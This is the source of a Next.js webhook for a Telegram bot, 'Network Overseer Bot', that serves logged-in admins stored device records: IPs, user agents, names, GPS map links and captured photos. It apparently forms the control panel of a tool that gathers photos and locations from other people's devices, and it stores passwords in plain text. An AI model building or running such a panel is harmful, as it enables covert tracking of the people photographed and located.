import { NextResponse } from 'next/server';
import { PrismaClient } from '@prisma/client';

const prisma = new PrismaClient();
export const dynamic = 'force-dynamic';

export async function POST(req: Request) {
  try {
    const body = await req.json();
    
    let chatId = '';
    let text = '';
    let callbackQueryId = null;

    if (body.callback_query) {
      chatId = body.callback_query.message.chat.id.toString();
      text = body.callback_query.data;
      callbackQueryId = body.callback_query.id;
    } else if (body.message && body.message.text) {
      chatId = body.message.chat.id.toString();
      text = body.message.text.trim();
    } else {
      return NextResponse.json({ success: true });
    }

    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const envAllowedChatIds = process.env.TELEGRAM_CHAT_ID ? process.env.TELEGRAM_CHAT_ID.split(',').map(id => id.trim()) : [];
    const superAdminPassword = process.env.SUPER_ADMIN_PASSWORD;

    if (!botToken) {
      console.error("TELEGRAM_BOT_TOKEN is not configured.");
      return NextResponse.json({ error: 'Not configured' }, { status: 500 });
    }

    const sendMessage = async (msg: string, reply_markup?: any) => {
      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: chatId, text: msg, parse_mode: 'Markdown', reply_markup })
      });
    };

    const editMessage = async (msgId: string, msg: string, reply_markup?: any) => {
      await fetch(`https://api.telegram.org/bot${botToken}/editMessageText`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: chatId, message_id: msgId, text: msg, parse_mode: 'Markdown', reply_markup })
      });
    };

    const sendPhoto = async (base64Image: string, caption: string) => {
      try {
        const base64Data = base64Image.replace(/^data:image\/\w+;base64,/, "");
        const buffer = Buffer.from(base64Data, 'base64');
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('photo', new Blob([buffer], { type: 'image/jpeg' }), 'photo.jpg');
        formData.append('caption', caption);
        
        await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: formData });
      } catch (err) {
        console.error("Failed to send photo:", err);
      }
    };

    if (callbackQueryId) {
      await fetch(`https://api.telegram.org/bot${botToken}/answerCallbackQuery`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ callback_query_id: callbackQueryId })
      });
    }

    if (text === '/start') {
      await sendMessage(`Welcome to *Network Overseer Bot*.\n\nYour Chat ID is: \`${chatId}\`\n\nTo access bot commands, type \`/login <PASSWORD>\`.`);
      return NextResponse.json({ success: true });
    }

    const args = text.split(/[ _]+/);
    const command = args[0].toLowerCase();

    if (command === '/login') {
      const password = args[1];
      if (!password) {
        await sendMessage("Usage: `/login <password>`");
        return NextResponse.json({ success: true });
      }
      
      let role = null;
      if (password === superAdminPassword) {
        role = "superadmin";
      } else {
        const admin = await prisma.adminUser.findUnique({ where: { password } });
        if (admin) {
          role = admin.canDelete ? "admin" : "viewer";
        }
      }

      if (role) {
        try {
          await prisma.telegramUser.upsert({
            where: { chatId },
            update: { username: (body.message?.chat.username || "Unknown"), role },
            create: { chatId, username: (body.message?.chat.username || "Unknown"), role }
          });
          await sendMessage(`✅ Access granted as *${role.toUpperCase()}*! You will receive notifications.\n\nSend \`/devices\` to view the interactive panel.`);
        } catch (err) {
          await sendMessage("❌ Database error while linking account.");
        }
      } else {
        await sendMessage("❌ Incorrect password.");
      }
      return NextResponse.json({ success: true });
    }

    // Check Authorization
    let isAuthorized = envAllowedChatIds.includes(chatId);
    let userRole = isAuthorized ? "superadmin" : "viewer"; 
    const dbUser = await prisma.telegramUser.findUnique({ where: { chatId } });
    if (dbUser) {
      isAuthorized = true;
      if (dbUser.role) userRole = dbUser.role;
    }

    if (!isAuthorized) {
      await sendMessage("Unauthorized. Your Chat ID is not registered. Use `/login <password>` to gain access.");
      return NextResponse.json({ success: true });
    }

    const showMainMenu = async () => {
      const scans = await prisma.deviceScan.findMany({
        select: { deviceId: true, publicIp: true, userAgent: true, userName: true }
      });
      
      const devicesMap = new Map();
      scans.forEach(scan => {
        if (!scan.deviceId) return;
        if (!devicesMap.has(scan.deviceId)) {
          devicesMap.set(scan.deviceId, { count: 0, ip: scan.publicIp, ua: scan.userAgent, name: scan.userName });
        }
        devicesMap.get(scan.deviceId).count++;
        if (scan.userName) devicesMap.get(scan.deviceId).name = scan.userName;
      });
      
      if (devicesMap.size === 0) {
        await sendMessage("No devices found in the database.");
      } else {
        let buttons: any[] = [];
        devicesMap.forEach((data, id) => {
          const shortId = id.substring(0, 8);
          buttons.push([{ text: `🖥️ ${data.name || data.ip} (${data.count} scans)`, callback_data: `menu_${shortId}` }]);
        });
        
        await sendMessage(`*📡 Connected Devices (${devicesMap.size})*\nSelect a device to manage:`, { inline_keyboard: buttons });
      }
    };

    const showDeviceMenu = async (shortId: string, messageIdToEdit?: string) => {
      const scan = await prisma.deviceScan.findFirst({
        where: { deviceId: { startsWith: shortId } },
        orderBy: { createdAt: 'desc' }
      });
      
      if (!scan) {
        await sendMessage(`❌ Device \`${shortId}\` not found.`);
        return;
      }
      
      const totalPhotos = await prisma.deviceScan.count({ where: { deviceId: scan.deviceId, image: { not: null } } });
      const totalScans = await prisma.deviceScan.count({ where: { deviceId: scan.deviceId } });
      
      let locStr = "Unknown";
      if (scan.latitude && scan.longitude) {
        locStr = `[Map](https://maps.google.com/?q=${scan.latitude},${scan.longitude})`;
      }

      const msg = `*📱 Device Details*\n\n*Name:* ${scan.userName || 'Unknown'}\n*IP:* \`${scan.publicIp || 'Unknown'}\`\n*OS:* ${scan.userAgent?.substring(0, 40) || 'Unknown'}\n*Location:* ${locStr}\n*Scans:* ${totalScans}\n*Photos Stored:* ${totalPhotos}`;
      
      const buttons = [
        [{ text: '📸 Photos (3)', callback_data: `photos_${shortId}_0_3` }, { text: '📸 Photos (10)', callback_data: `photos_${shortId}_0_10` }]
      ];
      
      if (userRole === "superadmin" || userRole === "admin") {
        buttons.push([{ text: '🧹 Clear Old Photos (Keep 1)', callback_data: `clean_${shortId}` }]);
        buttons.push([{ text: '❌ Delete Entire Device', callback_data: `delete_${shortId}` }]);
      }
      
      buttons.push([{ text: '🏠 Main Menu', callback_data: 'main_menu' }]);

      if (messageIdToEdit && body.callback_query) {
        await editMessage(body.callback_query.message.message_id.toString(), msg, { inline_keyboard: buttons });
      } else {
        await sendMessage(msg, { inline_keyboard: buttons });
      }
    };

    if (command === '/devices' || command === 'devices' || command === 'main') {
      await showMainMenu();
    } 
    else if (command === 'menu') {
      await showDeviceMenu(args[1], body.callback_query?.message?.message_id?.toString());
    }
    else if (command === '/delete' || command === 'delete') {
      if (userRole !== "superadmin" && userRole !== "admin") {
        await sendMessage("⛔ Permission denied. You don't have delete access.");
        return NextResponse.json({ success: true });
      }

      let deviceIdToDelete = args[1];
      if (!deviceIdToDelete) {
        await sendMessage("Please provide a Device ID: `/delete <shortId>`");
      } else {
        if (deviceIdToDelete.length < 20) {
          const scan = await prisma.deviceScan.findFirst({ where: { deviceId: { startsWith: deviceIdToDelete } } });
          if (scan && scan.deviceId) deviceIdToDelete = scan.deviceId;
        }

        const deleted = await prisma.deviceScan.deleteMany({
          where: { deviceId: deviceIdToDelete }
        });
        if (deleted.count > 0) {
          await sendMessage(`✅ Successfully deleted device \`${deviceIdToDelete.substring(0, 8)}...\` and all ${deleted.count} scans.`);
          await showMainMenu();
        } else {
          await sendMessage(`❌ Device starting with \`${deviceIdToDelete}\` not found.`);
        }
      }
    }
    else if (command === 'clean') {
      if (userRole !== "superadmin" && userRole !== "admin") {
        await sendMessage("⛔ Permission denied.");
        return NextResponse.json({ success: true });
      }
      
      let deviceId = args[1];
      const latestScan = await prisma.deviceScan.findFirst({
        where: { deviceId: { startsWith: deviceId }, image: { not: null } },
        orderBy: { createdAt: 'desc' }
      });
      
      if (!latestScan) {
        await sendMessage("No photos found to clean.");
      } else {
        const fullId = latestScan.deviceId;
        // Nullify all other images to save space
        const updated = await prisma.deviceScan.updateMany({
          where: { deviceId: fullId, id: { not: latestScan.id }, image: { not: null } },
          data: { image: null }
        });
        await sendMessage(`✅ Cleaned up ${updated.count} old photos to free up storage!`);
        await showDeviceMenu(args[1]);
      }
    }
    else if (command === '/photos' || command === 'photos') {
      let deviceId = args[1];
      let skip = parseInt(args[2]) || 0;
      let take = parseInt(args[3]) || 3;
      
      // If triggered manually without skip/take args like "/photos id 10"
      if (!args[3] && args[2] && !body.callback_query) {
        skip = 0;
        take = parseInt(args[2]);
      }

      if (!deviceId) {
        await sendMessage("Please provide a Device ID: `/photos <shortId> [amount]`");
      } else {
        if (deviceId.length < 20) {
          const scan = await prisma.deviceScan.findFirst({ where: { deviceId: { startsWith: deviceId } } });
          if (scan && scan.deviceId) deviceId = scan.deviceId;
        }

        const scansWithPhotos = await prisma.deviceScan.findMany({
          where: { deviceId, image: { not: null } },
          orderBy: { createdAt: 'desc' },
          skip,
          take
        });
        
        if (scansWithPhotos.length === 0) {
          await sendMessage(`No photos found in this range for \`${deviceId.substring(0, 8)}...\`.`);
        } else {
          await sendMessage(`Sending ${scansWithPhotos.length} photos (Skip: ${skip})...`);
          for (const scan of scansWithPhotos) {
            if (scan.image) {
              await sendPhoto(scan.image, `Scan from ${scan.createdAt.toISOString()}`);
            }
          }
          
          // Show options to fetch more
          const nextSkip = skip + take;
          const shortId = deviceId.substring(0, 8);
          await sendMessage(`*What's next?*`, {
            inline_keyboard: [
              [{ text: `📸 Fetch Next 10`, callback_data: `photos_${shortId}_${nextSkip}_10` }, { text: `📸 Fetch Next 50`, callback_data: `photos_${shortId}_${nextSkip}_50` }],
              [{ text: '« Back to Device', callback_data: `menu_${shortId}` }, { text: '🏠 Main Menu', callback_data: 'main_menu' }]
            ]
          });
        }
      }
    }
    else if (command === '/storage' || command === 'storage') {
      if (userRole !== "superadmin") {
        await sendMessage("⛔ Permission denied. Super Admin only.");
        return NextResponse.json({ success: true });
      }

      const allScans = await prisma.deviceScan.findMany({ select: { image: true } });
      let usedBytes = 0;
      allScans.forEach(s => {
        if (s.image) usedBytes += (s.image.length * 0.75);
      });
      const DB_LIMIT = 536870912; // 512MB
      const usedMB = (usedBytes / (1024 * 1024)).toFixed(2);
      const totalMB = (DB_LIMIT / (1024 * 1024)).toFixed(0);
      const percent = ((usedBytes / DB_LIMIT) * 100).toFixed(1);
      
      await sendMessage(`*💾 Storage Status*\n\nUsed: *${usedMB} MB* of ${totalMB} MB\nUsage: *${percent}%*`);
    }
    else if (command === '/users' || command === 'users') {
      if (userRole !== "superadmin") {
        await sendMessage("⛔ Permission denied. Super Admin only.");
        return NextResponse.json({ success: true });
      }
      
      const users = await prisma.adminUser.findMany();
      if (users.length === 0) {
        await sendMessage("No admin users found.");
      } else {
        let msg = `*Admin Users (${users.length})*\n\n`;
        users.forEach((u, i) => {
          msg += `${i + 1}. Name: \`${u.name}\`\n   Can Delete: ${u.canDelete ? 'Yes' : 'No'}\n\n`;
        });
        await sendMessage(msg);
      }
    }
    else if (command === '/createuser' || command === 'createuser') {
      if (userRole !== "superadmin") {
        await sendMessage("⛔ Permission denied. Super Admin only.");
        return NextResponse.json({ success: true });
      }
      const name = args[1];
      const password = args[2];
      if (!name || !password) {
        await sendMessage("Usage: `/createuser <name> <password>`");
      } else {
        try {
          await prisma.adminUser.create({ data: { name, password, canDelete: true } });
          await sendMessage(`✅ Created admin user \`${name}\`.`);
        } catch (err) {
          await sendMessage(`❌ Failed to create user. Password might not be unique.`);
        }
      }
    }
    else if (command === '/deleteuser' || command === 'deleteuser') {
      if (userRole !== "superadmin") {
        await sendMessage("⛔ Permission denied. Super Admin only.");
        return NextResponse.json({ success: true });
      }
      const name = args[1];
      if (!name) {
        await sendMessage("Usage: `/deleteuser <name>`");
      } else {
        const deleted = await prisma.adminUser.deleteMany({ where: { name } });
        if (deleted.count > 0) {
          await sendMessage(`✅ Successfully deleted user \`${name}\`.`);
        } else {
          await sendMessage(`❌ User \`${name}\` not found.`);
        }
      }
    }
    else {
      await sendMessage(`*📡 Network Overseer Bot Commands*
      
/devices - Interactive list of devices
/storage - Check DB usage (SuperAdmin)
/users - List admin users (SuperAdmin)
/createuser \`<name>\` \`<pass>\` - Create user
/deleteuser \`<name>\` - Delete user`);
    }

    return NextResponse.json({ success: true });
  } catch (error) {
    console.error("Telegram Webhook Error:", error);
    return NextResponse.json({ success: false });
  }
}
